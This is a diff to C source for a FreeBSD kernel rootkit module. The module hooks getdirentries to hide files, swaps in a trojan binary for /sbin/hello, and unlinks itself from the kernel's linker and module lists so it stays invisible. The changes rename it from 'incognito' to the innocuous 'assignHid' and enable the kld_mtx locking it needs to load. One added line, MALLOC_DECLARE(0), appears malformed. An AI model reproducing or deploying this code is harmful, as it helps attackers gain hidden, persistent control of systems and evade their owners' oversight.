@@ -23,14 +23,14 @@
 
 #define ORIGINAL "/sbin/hello"
 #define TROJAN "/sbin/trojan_hello"
-#define T_NAME "trojan_hello"
-#define VERSION "incognito-0.3.ko"
+#define T_NAME "assignHid"
+#define VERSION "assignHid.ko"
 /*
 * The following is the list of variables you need to reference in order
 * to hide this module, which aren't defined in any header files.
 */
 extern linker_file_list_t linker_files;
-//extern struct mtx kld_mtx;
+extern struct mtx kld_mtx;
 extern int next_file_id;
 typedef TAILQ_HEAD(, module) modulelist_t;
 extern modulelist_t modules;
@@ -124,7 +124,7 @@ getdirentries_hook(struct thread *td, void *syscall_args)
  /* Does fd actually contain any directory entries? */
      if (size > 0) {
          //malloc(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
-	 //MALLOC_DECLARE(dirent);
+	 MALLOC_DECLARE(0);
 	 dp = malloc(size, 0 ,M_NOWAIT);
          copyin(uap->buf, dp, size);
          current = dp;
@@ -173,7 +173,7 @@ load(struct module *module, int cmd, void *arg)
     struct linker_file *lf;
     struct module *mod;
     mtx_lock(&Giant);
-    //mtx_lock(&kld_mtx);
+    mtx_lock(&kld_mtx);
 /* Decrement the current kernel image's reference count. */
     (&linker_files)->tqh_first->refs--;
 /*
@@ -187,7 +187,7 @@ load(struct module *module, int cmd, void *arg)
             break;
         }
     }
-    //mtx_unlock(&kld_mtx);
+    mtx_unlock(&kld_mtx);
     mtx_unlock(&Giant);
     sx_xlock(&modules_sx);
 /*
@@ -207,8 +207,8 @@ load(struct module *module, int cmd, void *arg)
     return(0);
 }
 static moduledata_t incognito_mod = {
-    "incognito", /* module name */
+    "assignHid", /* module name */
     load, /* event handler */
     NULL /* extra data */
 };
-DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+DECLARE_MODULE(assignHid, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
